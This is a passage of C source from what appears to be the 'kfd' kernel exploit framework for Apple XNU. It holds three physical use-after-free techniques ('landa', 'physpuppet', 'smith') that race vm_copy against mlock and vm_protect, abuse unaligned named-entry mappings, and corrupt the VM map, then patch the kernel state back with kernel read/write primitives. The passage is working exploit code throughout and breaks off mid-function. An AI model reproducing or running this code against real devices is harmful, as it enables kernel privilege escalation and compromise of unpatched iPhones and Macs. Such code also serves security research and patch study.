const u64 landa_vme2_size = pages(1);
const u64 landa_vme4_size = pages(1);

// Forward declarations for helper functions.
void* landa_helper_spinner_pthread(void* arg);

struct landa_data {
    atomic_bool main_thread_returned;
    atomic_bool spinner_thread_started;
    vm_address_t copy_src_address;
    vm_address_t copy_dst_address;
    vm_size_t copy_size;
};

void landa_init(struct kfd* kfd)
{
    kfd->puaf.puaf_method_data_size = sizeof(struct landa_data);
    kfd->puaf.puaf_method_data = malloc_bzero(kfd->puaf.puaf_method_data_size);
}

void landa_run(struct kfd* kfd)
{
    struct landa_data* landa = (struct landa_data*)(kfd->puaf.puaf_method_data);

    /*
     * Note:
     * - The size of [src/dst]_vme_3 must be equal to pages(X), i.e. the desired PUAF size.
     * - The copy_size must be greater than msg_ool_size_small (32 KiB), therefore it is
     *   sufficient for [src/dst]_vme_1 and [src/dst]_vme_2 to have a size of pages(1).
     */
    u64 landa_vme3_size = pages(kfd->puaf.number_of_puaf_pages);
    vm_size_t copy_size = landa_vme1_size + landa_vme2_size + landa_vme3_size;
    landa->copy_size = copy_size;

    /*
     * STEP 1A:
     *
     * Allocate the source VMEs and VMOs:
     * - src_vme_1 has a size of pages(1) and owns the only reference to src_vmo_1.
     * - src_vme_2 has a size of pages(1) and owns the only reference to src_vmo_2.
     * - src_vme_3 has a size of pages(X) and owns the only reference to src_vmo_3.
     */
    vm_address_t src_address = 0;
    vm_size_t src_size = copy_size;
    assert_mach(vm_allocate(mach_task_self(), &src_address, src_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR));
    landa->copy_src_address = src_address;

    vm_address_t vme1_src_address = src_address;
    vm_address_t vme2_src_address = vme1_src_address + landa_vme1_size;
    vm_address_t vme3_src_address = vme2_src_address + landa_vme2_size;
    assert_mach(vm_allocate(mach_task_self(), &vme1_src_address, landa_vme1_size, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_FLAGS_PURGABLE));
    assert_mach(vm_allocate(mach_task_self(), &vme2_src_address, landa_vme2_size, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_FLAGS_PURGABLE));
    assert_mach(vm_allocate(mach_task_self(), &vme3_src_address, landa_vme3_size, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_FLAGS_PURGABLE));

    memset((void*)(src_address), 'A', copy_size);

    /*
     * STEP 1B:
     *
     * Allocate the destination VMEs and VMOs:
     * - dst_vme_1 has a size of pages(1) and owns the only reference to dst_vmo_1.
     *   dst_vme_1->user_wired_count == MAX_WIRE_COUNT, because of the mlock() for-loop.
     * - dst_vme_2 has a size of pages(1) and owns the only reference to dst_vmo_2.
     *   dst_vme_2->is_shared == TRUE, because of the vm_remap() on itself.
     *   dst_vme_2->user_wired_count == 1, because of mlock().
     * - After the clip in vm_protect(), dst_vme_3 has a size of pages(X) and dst_vme_4 has a size of pages(1).
     *   dst_vme_3 and dst_vme_4 each have a reference to dst_vmo_3.
     */
    vm_address_t dst_address = 0;
    vm_size_t dst_size = copy_size + landa_vme4_size;
    assert_mach(vm_allocate(mach_task_self(), &dst_address, dst_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR));
    landa->copy_dst_address = dst_address;

    vm_address_t vme1_dst_address = dst_address;
    vm_address_t vme2_dst_address = vme1_dst_address + landa_vme1_size;
    vm_address_t vme3_dst_address = vme2_dst_address + landa_vme2_size;
    vm_address_t vme4_dst_address = vme3_dst_address + landa_vme3_size;
    vm_prot_t cur_protection = VM_PROT_DEFAULT;
    vm_prot_t max_protection = VM_PROT_ALL;
    assert_mach(vm_allocate(mach_task_self(), &vme1_dst_address, landa_vme1_size, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_FLAGS_PURGABLE));
    assert_mach(vm_allocate(mach_task_self(), &vme2_dst_address, landa_vme2_size, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_FLAGS_PURGABLE));
    assert_mach(vm_remap(mach_task_self(), &vme2_dst_address, landa_vme2_size, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
        mach_task_self(), vme2_dst_address, FALSE, &cur_protection, &max_protection, VM_INHERIT_DEFAULT));
    assert_mach(vm_allocate(mach_task_self(), &vme3_dst_address, landa_vme3_size + landa_vme4_size, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_FLAGS_PURGABLE));
    assert_mach(vm_protect(mach_task_self(), vme4_dst_address, landa_vme4_size, FALSE, VM_PROT_READ));

    memset((void*)(dst_address), 'B', copy_size);

    for (u64 i = 0; i < UINT16_MAX; i++) {
        assert_bsd(mlock((void*)(vme1_dst_address), landa_vme1_size));
    }

    assert_bsd(mlock((void*)(vme2_dst_address), landa_vme2_size));

    /*
     * STEP 2:
     *
     * Trigger the race condition between vm_copy() in the main thread and mlock() in the spinner thread.
     */
    pthread_t spinner_thread = NULL;
    assert_bsd(pthread_create(&spinner_thread, NULL, landa_helper_spinner_pthread, kfd));

    while (!atomic_load(&landa->spinner_thread_started)) {
        usleep(10);
    }

    assert_mach(vm_copy(mach_task_self(), src_address, copy_size, dst_address));
    atomic_store(&landa->main_thread_returned, true);
    assert_bsd(pthread_join(spinner_thread, NULL));

    /*
     * STEP 3:
     *
     * Deallocate dst_vme_4, which will in turn deallocate the last reference of dst_vmo_3.
     * Therefore, dst_vmo_3 will be reaped and its pages put back on the free list.
     * However, we now have a PUAF on up to X of those pages in the VA range of dst_vme_3.
     */
    assert_mach(vm_deallocate(mach_task_self(), vme4_dst_address, landa_vme4_size));

    for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
        kfd->puaf.puaf_pages_uaddr[i] = vme3_dst_address + pages(i);
    }
}

void landa_cleanup(struct kfd* kfd)
{
    struct landa_data* landa = (struct landa_data*)(kfd->puaf.puaf_method_data);
    u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
    u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);

    u64 min_puaf_page_uaddr = min(kread_page_uaddr, kwrite_page_uaddr);
    u64 max_puaf_page_uaddr = max(kread_page_uaddr, kwrite_page_uaddr);

    assert_mach(vm_deallocate(mach_task_self(), landa->copy_src_address, landa->copy_size));

    vm_address_t address1 = landa->copy_dst_address;
    vm_size_t size1 = min_puaf_page_uaddr - landa->copy_dst_address;
    assert_mach(vm_deallocate(mach_task_self(), address1, size1));

    vm_address_t address2 = max_puaf_page_uaddr + pages(1);
    vm_size_t size2 = (landa->copy_dst_address + landa->copy_size) - address2;
    assert_mach(vm_deallocate(mach_task_self(), address2, size2));

    /*
     * No middle block if the kread and kwrite pages are the same or back-to-back.
     */
    if ((max_puaf_page_uaddr - min_puaf_page_uaddr) > pages(1)) {
        vm_address_t address3 = min_puaf_page_uaddr + pages(1);
        vm_size_t size3 = (max_puaf_page_uaddr - address3);
        assert_mach(vm_deallocate(mach_task_self(), address3, size3));
    }
}

void landa_free(struct kfd* kfd)
{
    u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
    u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);

    assert_mach(vm_deallocate(mach_task_self(), kread_page_uaddr, pages(1)));
    if (kwrite_page_uaddr != kread_page_uaddr) {
        assert_mach(vm_deallocate(mach_task_self(), kwrite_page_uaddr, pages(1)));
    }
}

/*
 * Helper landa functions.
 */

void* landa_helper_spinner_pthread(void* arg)
{
    struct kfd* kfd = (struct kfd*)(arg);
    struct landa_data* landa = (struct landa_data*)(kfd->puaf.puaf_method_data);

    atomic_store(&landa->spinner_thread_started, true);

    while (!atomic_load(&landa->main_thread_returned)) {
        kern_return_t kret = mlock((void*)(landa->copy_dst_address), landa->copy_size);
        assert((kret == KERN_SUCCESS) || ((kret == (-1)) && (errno == ENOMEM)));
        if (kret == KERN_SUCCESS) {
            break;
        }
    }

    return NULL;
}

#endif /* landa_h */

```

`kfd/libkfd/puaf/physpuppet.h`:

```h
/*
 * Copyright (c) 2023 FÃ©lix Poulin-BÃ©langer. All rights reserved.
 */

#ifndef physpuppet_h
#define physpuppet_h

const u64 physpuppet_vmne_size = pages(2) + 1;
const u64 physpuppet_vme_offset = pages(1);
const u64 physpuppet_vme_size = pages(2);

void physpuppet_init(struct kfd* kfd)
{
    /*
     * Nothing to do.
     */
    return;
}

void physpuppet_run(struct kfd* kfd)
{
    for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
        /*
         * STEP 1:
         *
         * Create a vm_named_entry. It will be backed by a vm_object with a
         * vo_size of 3 pages and an initial ref_count of 1.
         */
        mach_port_t named_entry = MACH_PORT_NULL;
        assert_mach(mach_memory_object_memory_entry_64(mach_host_self(), true, physpuppet_vmne_size, VM_PROT_DEFAULT, MEMORY_OBJECT_NULL, &named_entry));

        /*
         * STEP 2:
         *
         * Map the vm_named_entry into our vm_map. This will create a
         * vm_map_entry with a vme_start that is page-aligned, but a vme_end
         * that is not (vme_end = vme_start + 1 page + 1 byte). The new
         * vm_map_entry's vme_object is shared with the vm_named_entry, and
         * therefore its ref_count goes up to 2. Finally, the new vm_map_entry's
         * vme_offset is 1 page.
         */
        vm_address_t address = 0;
        assert_mach(vm_map(mach_task_self(), &address, (-1), 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, named_entry, physpuppet_vme_offset, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_DEFAULT));

        /*
         * STEP 3:
         *
         * Fault in both pages covered by the vm_map_entry. This will populate
         * the second and third vm_pages (by vmp_offset) of the vm_object. Most
         * importantly, this will set the two L3 PTEs covered by that virtual
         * address range with read and write permissions.
         */
        memset((void*)(address), 'A', physpuppet_vme_size);

        /*
         * STEP 4:
         *
         * Unmap that virtual address range. Crucially, when vm_map_delete()
         * calls pmap_remove_options(), only the first L3 PTE gets cleared. The
         * vm_map_entry is deallocated and therefore the vm_object's ref_count
         * goes down to 1.
         */
        assert_mach(vm_deallocate(mach_task_self(), address, physpuppet_vme_size));

        /*
         * STEP 5:
         *
         * Destroy the vm_named_entry. The vm_object's ref_count drops to 0 and
         * therefore is reaped. This will put all of its vm_pages on the free
         * list without calling pmap_disconnect().
         */
        assert_mach(mach_port_deallocate(mach_task_self(), named_entry));
        kfd->puaf.puaf_pages_uaddr[i] = address + physpuppet_vme_offset;

        /*
         * STEP 6:
         *
         * At this point, we have a dangling L3 PTE. However, there's a
         * discrepancy between the vm_map and the pmap. If not fixed, it will
         * cause a panic when the process exits. Therefore, we need to reinsert
         * a vm_map_entry in that virtual address range. We also need to fault
         * in the first page to populate the vm_object. Otherwise,
         * vm_map_delete() won't call pmap_remove_options() on exit. But we
         * don't fault in the second page to avoid overwriting our dangling PTE.
         */
        assert_mach(vm_allocate(mach_task_self(), &address, physpuppet_vme_size, VM_FLAGS_FIXED));
        memset((void*)(address), 'A', physpuppet_vme_offset);
    }
}

void physpuppet_cleanup(struct kfd* kfd)
{
    u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
    u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);

    for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
        u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
        if ((puaf_page_uaddr == kread_page_uaddr) || (puaf_page_uaddr == kwrite_page_uaddr)) {
            continue;
        }

        assert_mach(vm_deallocate(mach_task_self(), puaf_page_uaddr - physpuppet_vme_offset, physpuppet_vme_size));
    }
}

void physpuppet_free(struct kfd* kfd)
{
    u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
    u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);

    assert_mach(vm_deallocate(mach_task_self(), kread_page_uaddr - physpuppet_vme_offset, physpuppet_vme_size));
    if (kwrite_page_uaddr != kread_page_uaddr) {
        assert_mach(vm_deallocate(mach_task_self(), kwrite_page_uaddr - physpuppet_vme_offset, physpuppet_vme_size));
    }
}

#endif /* physpuppet_h */

```

`kfd/libkfd/puaf/smith.h`:

```h
/*
 * Copyright (c) 2023 FÃ©lix Poulin-BÃ©langer. All rights reserved.
 */

#ifndef smith_h
#define smith_h

/*
 * This boolean parameter determines whether the vm_map_lock() is taken from
 * another thread before attempting to clean up the VM map in the main thread.
 */
const bool take_vm_map_lock = true;

// Forward declarations for helper functions.
void smith_helper_init(struct kfd* kfd);
void* smith_helper_spinner_pthread(void* arg);
void* smith_helper_cleanup_pthread(void* arg);
void smith_helper_cleanup(struct kfd* kfd);

/*
 * This structure is allocated once in smith_init() and contains all the data
 * needed/shared across multiple functions for the PUAF part of the exploit.
 */
struct smith_data {
    atomic_bool main_thread_returned;
    atomic_int started_spinner_pthreads;
    struct {
        vm_address_t address;
        vm_size_t size;
    } vme[5];
    struct {
        pthread_t pthread;
        atomic_bool should_start;
        atomic_bool did_start;
        atomic_uintptr_t kaddr;
        atomic_uintptr_t right;
        atomic_uintptr_t max_address;
    } cleanup_vme;
};

/*
 * This function is responsible for the following:
 * 1. Allocate the singleton "smith_data" structure. See the comment above the
 *    smith_data structure for more info.
 * 2. Call smith_helper_init() which is responsible to initialize everything
 *    needed for the PUAF part of the exploit. See the comment above
 *    smith_helper_init() for more info.
 */
void smith_init(struct kfd* kfd)
{
    kfd->puaf.puaf_method_data_size = sizeof(struct smith_data);
    kfd->puaf.puaf_method_data = malloc_bzero(kfd->puaf.puaf_method_data_size);

    smith_helper_init(kfd);
}

/*
 * This function is responsible to run the bulk of the work, from triggering the
 * initial vulnerability to achieving a PUAF on an arbitrary number of pages.
 * It is described in detail in the write-up, with a figure illustrating the
 * relevant kernel state after each step.
 */
void smith_run(struct kfd* kfd)
{
    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);

    /*
     * STEP 1:
     */
    assert_mach(vm_allocate(mach_task_self(), &smith->vme[2].address, smith->vme[2].size, VM_FLAGS_FIXED));
    assert_mach(vm_allocate(mach_task_self(), &smith->vme[1].address, smith->vme[1].size, VM_FLAGS_FIXED));
    assert_mach(vm_allocate(mach_task_self(), &smith->vme[0].address, smith->vme[0].size, VM_FLAGS_FIXED));
    assert_mach(vm_allocate(mach_task_self(), &smith->vme[3].address, smith->vme[3].size, VM_FLAGS_FIXED | VM_FLAGS_PURGABLE));
    assert_mach(vm_allocate(mach_task_self(), &smith->vme[4].address, smith->vme[4].size, VM_FLAGS_FIXED | VM_FLAGS_PURGABLE));

    /*
     * STEP 2:
     *
     * Note that vm_copy() in the main thread corresponds to substep 2A in the write-up
     * and vm_protect() in the spawned threads corresponds to substep 2B.
     */
    const u64 number_of_spinner_pthreads = 4;
    pthread_t spinner_pthreads[number_of_spinner_pthreads] = {};

    for (u64 i = 0; i < number_of_spinner_pthreads; i++) {
        assert_bsd(pthread_create(&spinner_pthreads[i], NULL, smith_helper_spinner_pthread, kfd));
    }

    while (atomic_load(&smith->started_spinner_pthreads) != number_of_spinner_pthreads) {
        usleep(10);
    }

    assert(vm_copy(mach_task_self(), smith->vme[2].address, (0ull - smith->vme[2].address - 1), 0) == KERN_PROTECTION_FAILURE);
    atomic_store(&smith->main_thread_returned, true);

    for (u64 i = 0; i < number_of_spinner_pthreads; i++) {
        /*
         * I am not sure if joining the spinner threads here will cause the
         * deallocation of their stack in the VM map. I have never ran into
         * panics because of this, but it is something to keep in mind.
         * Otherwise, if it becomes a problem, we can simply make those spinner
         * threads sleep in a loop until the main thread sends them a signal
         * that the cleanup is finished.
         */
        assert_bsd(pthread_join(spinner_pthreads[i], NULL));
    }

    /*
     * STEP 3:
     */
    assert_mach(vm_copy(mach_task_self(), smith->vme[3].address, smith->vme[3].size, smith->vme[1].address));
    memset((void*)(smith->vme[1].address), 'A', smith->vme[1].size);

    /*
     * STEP 4:
     */
    assert_mach(vm_protect(mach_task_self(), smith->vme[1].address, smith->vme[3].size, false, VM_PROT_DEFAULT));

    /*
     * STEP 5:
     */
    assert_mach(vm_copy(mach_task_self(), smith->vme[4].address, smith->vme[4].size, smith->vme[0].address));

    for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
        kfd->puaf.puaf_pages_uaddr[i] = smith->vme[1].address + pages(i);
    }
}

/*
 * This function is responsible for the following:
 * 1. Call smith_helper_cleanup() which is responsible to patch up the corrupted
 *    state of our VM map. Technically, this is the only thing that is required
 *    to get back to a safe state, which means there is no more risk of a kernel
 *    panic if the process exits or performs any VM operation.
 * 2. Deallocate the unused virtual memory that we allocated in step 1 of
 *    smith_run(). In other words, we call vm_deallocate() for the VA range
 *    covered by those 5 map entries (i.e. vme0 to vme4 in the write-up), except
 *    for the two pages used by the kread/kwrite primitive. This step is not
 *    required for "panic-safety".
 */
void smith_cleanup(struct kfd* kfd)
{
    smith_helper_cleanup(kfd);

    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);
    u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
    u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);

    u64 min_puaf_page_uaddr = min(kread_page_uaddr, kwrite_page_uaddr);
    u64 max_puaf_page_uaddr = max(kread_page_uaddr, kwrite_page_uaddr);

    vm_address_t address1 = smith->vme[0].address;
    vm_size_t size1 = smith->vme[0].size + (min_puaf_page_uaddr - smith->vme[1].address);
    assert_mach(vm_deallocate(mach_task_self(), address1, size1));

    vm_address_t address2 = max_puaf_page_uaddr + pages(1);
    vm_size_t size2 = (smith->vme[2].address - address2) + smith->vme[2].size + smith->vme[3].size + smith->vme[4].size;
    assert_mach(vm_deallocate(mach_task_self(), address2, size2));

    /*
     * No middle block if the kread and kwrite pages are the same or back-to-back.
     */
    if ((max_puaf_page_uaddr - min_puaf_page_uaddr) > pages(1)) {
        vm_address_t address3 = min_puaf_page_uaddr + pages(1);
        vm_size_t size3 = (max_puaf_page_uaddr - address3);
        assert_mach(vm_deallocate(mach_task_self(), address3, size3));
    }
}

/*
 * This function is responsible to deallocate the virtual memory for the two
 * pages used by the kread/kwrite primitive, i.e. the two pages that we did not
 * deallocate during smith_cleanup(). Once again, this step is not required for
 * "panic-safety". It can be called either if the kread/kwrite primitives no
 * longer rely on kernel objects that are controlled through the PUAF primitive,
 * or if we want to completely tear down the exploit.
 */
void smith_free(struct kfd* kfd)
{
    u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
    u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);

    assert_mach(vm_deallocate(mach_task_self(), kread_page_uaddr, pages(1)));
    if (kwrite_page_uaddr != kread_page_uaddr) {
        assert_mach(vm_deallocate(mach_task_self(), kwrite_page_uaddr, pages(1)));
    }
}

/*
 * This function is responsible for the following:
 * 1. If the constant "target_hole_size" is non-zero, it will allocate every
 *    hole in our VM map starting at its min_offset, until we find a hole at
 *    least as big as that value (e.g. 10k pages). The reason for that is that
 *    we will corrupt the hole list when we trigger the vulnerability in
 *    smith_run(), such that only the first hole is safe to allocate from. This
 *    is exactly what happens during a typical call to vm_allocate() with
 *    VM_FLAGS_ANYWHERE. That said, many other VM operations that modify our map
 *    entries or our hole list could cause a kernel panic. So, if it is possible
 *    at all, it is much safer to suspend all other threads running in the target
 *    process (e.g. WebContent). In that case, since we would control the only
 *    running threads during the critical section, we could guarantee that no
 *    unsafe VM operations will happen and "target_hole_size" can be set to 0.
 * 2. We need to find the VA range from which we will allocate our 5 map entries
 *    in smith_run() during step 1 (i.e. vme0 to vme4 in the write-up). Those 5
 *    map entries will cover (3X+5) pages, where X is the desired number of
 *    PUAF pages. For reasons that are explained in the write-up, we want to
 *    allocate them towards the end of our VM map. Therefore, we find the last
 *    hole that is big enough to hold our 5 map entries.
 */
void smith_helper_init(struct kfd* kfd)
{
    const u64 target_hole_size = pages(0);
    bool found_target_hole = false;

    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);
    smith->vme[0].size = pages(1);
    smith->vme[1].size = pages(kfd->puaf.number_of_puaf_pages);
    smith->vme[2].size = pages(1);
    smith->vme[3].size = (smith->vme[1].size + smith->vme[2].size);
    smith->vme[4].size = (smith->vme[0].size + smith->vme[3].size);
    u64 smith_total_size = (smith->vme[3].size + smith->vme[4].size + smith->vme[4].size);

    u64 min_address, max_address;
    puaf_helper_get_vm_map_min_and_max(&min_address, &max_address);

    /*
     * If the boolean parameter "take_vm_map_lock" is turned on, we spawn the
     * thread running smith_helper_cleanup_pthread() right here. Please see the
     * comment above smith_helper_cleanup_pthread() for more info.
     */
    if (take_vm_map_lock) {
        atomic_store(&smith->cleanup_vme.max_address, max_address);
        assert_bsd(pthread_create(&smith->cleanup_vme.pthread, NULL, smith_helper_cleanup_pthread, kfd));
    }

    vm_address_t address = 0;
    vm_size_t size = 0;
    vm_region_basic_info_data_64_t data = {};
    vm_region_info_t info = (vm_region_info_t)(&data);
    mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
    mach_port_t port = MACH_PORT_NULL;

    vm_address_t vme0_address = 0;
    vm_address_t prev_vme_end = 0;

    while (true) {
        kern_return_t kret = vm_region_64(mach_task_self(), &address, &size, VM_REGION_BASIC_INFO_64, info, &count, &port);
        if ((kret == KERN_INVALID_ADDRESS) || (address >= max_address)) {
            if (found_target_hole) {
                vm_size_t last_hole_size = max_address - prev_vme_end;
                /*
                 * If "target_hole_size" is zero, we could instead simply set
                 * "vme0_address" to (map->max_offset - smith_total_size),
                 * after making sure that this VA range is not already mapped.
                 */
                if (last_hole_size >= (smith_total_size + pages(1))) {
                    vme0_address = (max_address - smith_total_size);
                }
            }

            break;
        }

        assert(kret == KERN_SUCCESS);

        /*
         * Quick hack: pre-fault code pages to avoid faults during the critical section.
         */
        if (data.protection & VM_PROT_EXECUTE) {
            for (u64 page_address = address; page_address < address + size; page_address += pages(1)) {
                u64 tmp_value = *(volatile u64*)(page_address);
            }
        }

        vm_address_t hole_address = prev_vme_end;
        vm_size_t hole_size = address - prev_vme_end;

        if (prev_vme_end < min_address) {
            goto next_vm_region;
        }

        if (found_target_hole) {
            if (hole_size >= (smith_total_size + pages(1))) {
                vme0_address = (address - smith_total_size);
            }
        } else {
            if (hole_size >= target_hole_size) {
                found_target_hole = true;
            } else if (hole_size > 0) {
                assert_mach(vm_allocate(mach_task_self(), &hole_address, hole_size, VM_FLAGS_FIXED));
            }
        }

next_vm_region:
        address += size;
        size = 0;
        prev_vme_end = address;
    }

    assert(found_target_hole);

    smith->vme[0].address = vme0_address;
    smith->vme[1].address = smith->vme[0].address + smith->vme[0].size;
    smith->vme[2].address = smith->vme[1].address + smith->vme[1].size;
    smith->vme[3].address = smith->vme[2].address + smith->vme[2].size;
    smith->vme[4].address = smith->vme[3].address + smith->vme[3].size;
}

/*
 * This function is ran by 4 spinner threads spawned from smith_run() in step 2.
 * It simply attempts to change the protection of virtual page zero to
 * VM_PROT_WRITE in a busy-loop, which will return KERN_INVALID_ADDRESS until
 * the main thread triggers the bad clip in vm_map_copyin_internal(). At that
 * point, vm_protect() will return KERN_SUCCESS. Finally, once the main thread
 * returns from vm_copy(), it will set "main_thread_returned" to true in order
 * to signal all 4 spinner threads to exit.
 */
void* smith_helper_spinner_pthread(void* arg)
{
    struct kfd* kfd = (struct kfd*)(arg);
    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);

    atomic_fetch_add(&smith->started_spinner_pthreads, 1);

    while (!atomic_load(&smith->main_thread_returned)) {
        kern_return_t kret = vm_protect(mach_task_self(), 0, pages(1), false, VM_PROT_WRITE);
        assert((kret == KERN_SUCCESS) || (kret == KERN_INVALID_ADDRESS));
    }

    return NULL;
}

#define store_for_vme(kaddr) ((kaddr) ? (((kaddr) + offsetof(struct vm_map_entry, store.entry.rbe_left))) : (kaddr))
#define vme_for_store(kaddr) ((kaddr) ? (((kaddr) - offsetof(struct vm_map_entry, store.entry.rbe_left)) & (~1ull)) : (kaddr))

/*
 * This function is only ran from a thread spawned in smith_helper_init() if the
 * boolean parameter "take_vm_map_lock" is turned on. The reason why it is
 * spawned that early, instead of at the beginning of smith_helper_cleanup(), is
 * that pthread creation will allocate virtual memory for its stack, which might
 * cause a kernel panic because we have not patched the corrupted VM map state
 * yet. It sleeps for 1 ms in a loop until the main thread sets
 * "cleanup_vme.should_start" to true to signal this thread to start the
 * procedure to take the vm_map_lock(). It does so by patching the right child
 * of a map entry to point back to itself, then it sets "cleanup_vme.did_start"
 * to true to signal the main thread to start patching the state, and finally it
 * calls vm_protect(), which will take the vm_map_lock() indefinitely while
 * vm_map_lookup_entry() spins on the right child. Once the main thread has
 * finished patching up the state, it will restore the right child to its
 * original value, which will cause vm_protect() to return and this pthread to
 * exit.
 */
void* smith_helper_cleanup_pthread(void* arg)
{
    struct kfd* kfd = (struct kfd*)(arg);
    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);
    vm_address_t max_address = atomic_load(&smith->cleanup_vme.max_address);
    vm_address_t cleanup_vme_end = 0;

    while (!atomic_load(&smith->cleanup_vme.should_start)) {
        usleep(1000);
    }

    do {
        /*
         * Find the last entry with vme_end smaller than the map's max_offset,
         * with a right child that is not null, but not the entry we are going to leak.
         */
        u64 map_kaddr = kfd->info.kaddr.current_map;
        u64 entry_kaddr = static_kget(struct _vm_map, hdr.links.prev, map_kaddr);

        while (true) {
            u64 entry_prev = static_kget(struct vm_map_entry, links.prev, entry_kaddr);
            u64 entry_start = static_kget(struct vm_map_entry, links.start, entry_kaddr);
            u64 entry_end = static_kget(struct vm_map_entry, links.end, entry_kaddr);
            u64 entry_right = static_kget(struct vm_map_entry, store.entry.rbe_right, entry_kaddr);

            if ((entry_end < max_address) && (entry_right != 0) && (entry_start != 0)) {
                /*
                 * Patch the entry to have its right child point to itself.
                 */
                atomic_store(&smith->cleanup_vme.kaddr, entry_kaddr);
                atomic_store(&smith->cleanup_vme.right, entry_right);
                static_kset(struct vm_map_entry, store.entry.rbe_right, store_for_vme(entry_kaddr), entry_kaddr);
                cleanup_vme_end = entry_end;
                break;
            }

            entry_kaddr = entry_prev;
        }
    } while (0);

    atomic_store(&smith->cleanup_vme.did_start, true);
    vm_protect(mach_task_self(), cleanup_vme_end, pages(1), false, VM_PROT_ALL);
    return NULL;
}

/*
 * This function is responsible to patch the corrupted state of our VM map. If
 * the boolean parameter "take_vm_map_lock" is turned on, please see the comment
 * above smith_helper_cleanup_pthread() for more info. Otherwise, the rest of
 * the function simply uses the kread primitive to scan the doubly-linked list
 * of map entries as well as the hole list, and the kwrite primitive to patch it
 * up. This procedure is explained in detail in part C of the write-up.
 */
void smith_helper_cleanup(struct kfd* kfd)
{
    assert(kfd->info.kaddr.current_map);
    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);

    if (take_vm_map_lock) {
        atomic_store(&smith->cleanup_vme.should_start, true);
        while (!atomic_load(&smith->cleanup_vme.did_start)) {
            usleep(10);
        }

        /*
         * Sleep an extra 100 us to make sure smith_helper_cleanup_pthread()
         * had the time to take the vm_map_lock().
         */
        usleep(100);
    }

    u64 map_kaddr = kfd->info.kaddr.current_map;

    do {
        /*
         * Scan map entries: we use the kread primitive to loop through every
         * map entries in our VM map, and record the information that we need to
         * patch things up below. There are some assertions along the way to
         * make sure the state of the VM map is corrupted as expected.
         */
        u64 entry_count = 0;
        u64 entry_kaddr = static_kget(struct _vm_map, hdr.links.next, map_kaddr);
        u64 map_entry_kaddr = map_kaddr + offsetof(struct _vm_map, hdr.links.prev);
        u64 first_vme_kaddr = 0;
        u64 first_vme_parent_store = 0;
        u64 second_vme_kaddr = 0;
        u64 second_vme_left_store = 0;
        u64 vme_end0_kaddr = 0;
        u64 vme_end0_start = 0;
        u64 leaked_entry_right_store = 0;
        u64 leaked_entry_parent_store = 0;
        u64 leaked_entry_prev = 0;
        u64 leaked_entry_next = 0;
        u64 leaked_entry_end = 0;

        while (entry_kaddr != map_entry_kaddr) {
            entry_count++;
            u64 entry_next = static_kget(struct vm_map_entry, links.next, entry_kaddr);
            u64 entry_start = static_kget(struct vm_map_entry, links.start, entry_kaddr);
            u64 entry_end = static_kget(struct vm_map_entry, links.end, entry_kaddr);

            if (entry_count == 1) {
                first_vme_kaddr = entry_kaddr;
                first_vme_parent_store = static_kget(struct vm_map_entry, store.entry.rbe_parent, entry_kaddr);
                u64 first_vme_left_store = static_kget(struct vm_map_entry, store.entry.rbe_left, entry_kaddr);
                u64 first_vme_right_store = static_kget(struct vm_map_entry, store.entry.rbe_right, entry_kaddr);
                assert(first_vme_left_store == 0);
                assert(first_vme_right_store == 0);
            } else if (entry_count == 2) {
                second_vme_kaddr = entry_kaddr;
                second_vme_left_store = static_kget(struct vm_map_entry, store.entry.rbe_left, entry_kaddr);
            } else if (entry_end == 0) {
                vme_end0_kaddr = entry_kaddr;
                vme_end0_start = entry_start;
                assert(vme_end0_start == smith->vme[1].address);
            } else if (entry_start == 0) {
                assert(entry_kaddr == vme_for_store(first_vme_parent_store));
                assert(entry_kaddr == vme_for_store(second_vme_left_store));
                u64 leaked_entry_left_store = static_kget(struct vm_map_entry, store.entry.rbe_left, entry_kaddr);
                leaked_entry_right_store = static_kget(struct vm_map_entry, store.entry.rbe_right, entry_kaddr);
                leaked_entry_parent_store = static_kget(struct vm_map_entry, store.entry.rbe_parent, entry_kaddr);
                assert(leaked_entry_left_store == 0);
                assert(vme_for_store(leaked_entry_right_store) == first_vme_kaddr);
                assert(vme_for_store(leaked_entry_parent_store) == second_vme_kaddr);
                leaked_entry_prev = static_kget(struct vm_map_entry, links.prev, entry_kaddr);
                leaked_entry_next = entry_next;
                leaked_entry_end = entry_end;
                assert(leaked_entry_end == smith->vme[3].address);
            }

            entry_kaddr = entry_next;
